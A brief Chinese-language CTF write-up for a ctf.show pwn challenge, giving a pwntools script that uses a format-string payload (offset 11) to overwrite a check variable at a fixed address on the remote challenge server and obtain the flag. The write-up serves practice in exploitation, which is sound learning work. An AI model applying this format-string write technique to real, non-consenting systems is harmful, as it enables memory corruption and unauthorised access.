# 挑战简介
覆写某个值满足某条件好像就可以了

# 思路
一个简单检测题，找到check位置并写入true，从而直接得到flag  

```
from pwn import *
from LibcSearcher import *
#context(arch = "amd64",os = 'linux',log_level = 'debug')

context(arch = "i386",os = 'linux',log_level = 'debug')

#io = process("./pwn")

io = remote('pwn.challenge.ctf.show',28300)

elf = ELF('D:\edge 下载\pwn')

offset = 11

check = 0x0804B040

payload = fmtstr_payload(offset, {check:1})

print(payload)

io.sendline(payload)

io.interactive()
```
